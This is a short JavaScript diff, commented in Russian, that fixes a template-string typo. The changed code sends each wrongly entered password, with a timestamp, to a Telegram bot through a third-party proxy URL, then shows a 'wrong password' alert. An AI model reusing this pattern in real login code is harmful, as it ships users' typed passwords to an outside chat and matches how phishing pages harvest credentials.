@@ -256,7 +256,7 @@ const url = `https://telegram-bot-api.vercel.app/bot${TELEGRAM_BOT_TOKEN}/sendMe
                 // Неверный пароль
                 if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
                     const text = `❌ Неверный пароль\nПароль: ${code}\nВремя: ${now}`;
-                    const url = `https://telegram-bot-api.vercel.app/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)`};
+                    const url = `https://telegram-bot-api.vercel.app/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`;
                     fetch(url).catch(err => console.error(err));
                 }
                 alert('Неверный пароль!');
